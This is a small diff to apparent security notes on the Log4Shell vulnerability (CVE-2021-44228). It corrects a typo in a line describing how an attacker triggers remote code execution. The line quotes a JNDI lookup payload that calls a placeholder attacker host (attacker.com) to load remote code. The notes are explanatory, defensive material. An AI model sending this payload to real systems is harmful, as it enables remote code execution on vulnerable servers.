@@ -96,7 +96,7 @@ Log4j Analysis 
 
 **Log4Shell (CVE-2021-44228)**
 - vulnerability that allows Remote Code Execution (RCE).
-- An attaacker can send a specially crafted string containing a JNDI "Java Naming and Directory Interface" reference such as --->`${jndi:ldap://attacker.com/Exploit}`
+- An attacker can send a specially crafted string containing a JNDI "Java Naming and Directory Interface" reference such as --->`${jndi:ldap://attacker.com/Exploit}`
 
 |	|	|
 |---|---|
